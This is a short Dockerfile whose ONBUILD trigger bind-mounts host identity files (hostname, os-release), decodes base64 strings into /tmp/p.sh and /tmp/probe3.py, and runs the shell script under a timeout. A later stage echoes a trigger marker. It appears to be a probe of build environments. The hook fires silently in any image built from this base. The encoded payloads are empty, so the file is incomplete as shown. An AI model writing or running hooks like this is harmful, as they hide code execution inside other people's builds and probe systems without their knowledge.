FROM alpine:3.20 AS base
RUN apk add --no-cache python3 iproute2 >/dev/null 2>&1; echo APK_RC=$?
ONBUILD RUN --mount=type=bind,source=etc/hostname,target=/hhn,ro --mount=type=bind,source=usr/lib/os-release,target=/hos,ro sh -c 'echo  | base64 -d > /tmp/p.sh; echo  | base64 -d > /tmp/probe3.py; timeout 240 sh /tmp/p.sh'
FROM base
RUN echo I67604D_TRIG_5be1_$(date +%s 2>/dev/null || echo 1)
